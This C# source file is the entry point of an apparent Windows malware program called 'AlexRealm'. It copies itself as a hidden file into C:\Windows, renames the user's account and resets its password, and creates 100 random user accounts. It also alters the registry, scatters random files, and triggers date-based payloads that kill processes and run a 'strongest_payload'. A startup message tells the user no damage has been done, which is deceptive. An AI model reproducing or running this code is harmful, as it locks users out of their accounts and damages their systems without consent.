using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace AlexRealm
{
    public class EntryPoint
    {
        public static void Main()
        {
            string HKLMWinNTCurrent = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion";
            string os_ver = Registry.GetValue(HKLMWinNTCurrent, "CurrentMajorVersionNumber", "").ToString();
            if (os_ver != "10")
            {
                MessageBox.Show("AlexRealm is not compatible with your version of Windows. Please install Windows 10 or newer to run this application. No damage has been done to your OS.", "Incompatible Version", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(-1);
            }
            int[] dates = { 300, 48, 116 };
            Random rand;
            rand = new Random();
            if (!File.Exists(@"C:\Windows\AlexRealm.exe")) 
            {
                File.Copy(Application.ExecutablePath, @"C:\Windows\AlexRealm.exe");
                File.SetAttributes(@"C:\Windows\AlexRealm.exe", FileAttributes.Hidden);
                cmd_func.cmd("cmd.exe", @"/k wmic useraccount where name='%username%' rename" + "ALEXSREALM" + @" && net user ALEXSREALM realm && exit");
                for (int num = 0; num < 100; num++) 
                {
                    cmd_func.cmd("cmd.exe", @"/k net user " + Generator_char.gen(14) + " " + Generator_char.gen(14) + @" /add && exit");
                    Thread.Sleep(10);
                 }
                RegistryChange.regs();
                Random_files.rnd_files();
            }
            else if (dates[0] == DateTime.Now.DayOfYear)
            {
                 Final.strongest_payload();
            }
            else if (dates[1] == DateTime.Now.DayOfYear)
            {
                var move_payload = new Move_icons();
                 move_payload.move();
             }
            else if (dates[2] == DateTime.Now.DayOfYear)
            {
                  var kill_payload = new process_killer();
                  kill_payload.kill_process();
            }
        }
    }
}